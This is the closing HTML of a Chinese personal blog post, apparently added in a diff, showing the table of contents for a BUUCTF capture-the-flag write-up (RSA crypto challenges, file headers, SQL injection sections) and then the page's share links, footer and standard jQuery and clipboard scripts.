href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.2.</span> <span class="toc-text">这是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#keyboard"><span class="toc-number">4.3.</span> <span class="toc-text">keyboard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E8%A7%85%F0%9F%90%8E"><span class="toc-number">4.4.</span> <span class="toc-text">这是什么觅🐎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-BabyRSA"><span class="toc-number">4.5.</span> <span class="toc-text">[GWCTF 2019]BabyRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#samemod"><span class="toc-number">4.6.</span> <span class="toc-text">samemod</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-easyrsa"><span class="toc-number">4.7.</span> <span class="toc-text">[BJDCTF2020]easyrsa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%AA%E9%87%8C%E6%B7%98%E6%B2%99"><span class="toc-number">4.8.</span> <span class="toc-text">浪里淘沙</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B8%A1%E8%97%95%E6%A4%92%E7%9B%90%E5%91%B3"><span class="toc-number">4.9.</span> <span class="toc-text">鸡藕椒盐味</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E5%A4%A7%E6%95%B0%E8%AE%A1%E7%AE%97"><span class="toc-number">4.10.</span> <span class="toc-text">[WUSTCTF2020]大数计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF2018-%E8%8A%B1%E5%BC%80%E8%97%8F%E5%AE%9D%E5%9C%B0"><span class="toc-number">4.11.</span> <span class="toc-text">[AFCTF2018]花开藏宝地</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-number">5.1.</span> <span class="toc-text">常见文件头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97"><span class="toc-number">5.2.</span> <span class="toc-text">常见SQL注入系列</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-SQL%E5%A4%A7%E6%89%8B%E5%AD%90"><span class="toc-number">5.3.</span> <span class="toc-text">自动注入系列(SQL大手子)</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2025/10/02/20017_buuctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://narafluorine.github.io/2025/10/02/20017_buuctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2025/10/02/20017_buuctf/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2025/10/02/20017_buuctf/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Fluorine Wengers
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/QSL/">QSL</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
